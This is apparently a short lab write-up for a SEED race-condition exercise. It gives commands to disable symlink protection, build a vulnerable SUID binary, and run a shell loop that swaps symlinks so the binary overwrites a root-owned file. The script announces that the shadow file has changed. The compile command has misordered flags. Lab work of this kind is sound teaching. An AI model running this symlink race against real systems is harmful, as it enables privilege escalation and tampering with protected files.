*Exploit the RACE CONDITION vulnerability*
run in Linux 2.6 + (Ubuntu in this case)
must disable symlink protections:
sudo sysctl -w kernel.yama.protected_sticky_symlinks=0


First create a /tmp/XYZ file w user
Then create a /tmp/rootfile file w root permissions

Compile vuln.c using gcc:
gcc -o -m32 vuln vuln.c

then change permissions for running w/SUID

chmod 4755 vuln

then run the following script:
```
#!/bin/sh


old=`ls -l /tmp/rootfile`
new=`ls -l /tmp/rootfile`
while [ "$old" = "$new" ]
do
    ln -sf /tmp/asd /tmp/XYZ
    ./vuln | echo '9999' &
    ln -sf /tmp/rootfile /tmp/XYZ
    new=`ls -l /tmp/rootfile`
done

echo "STOP... The shadow file has been changed"
echo "Ficheiro alterado:"
cat /tmp/rootfile
```

Read More over:
http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Race_Condition/
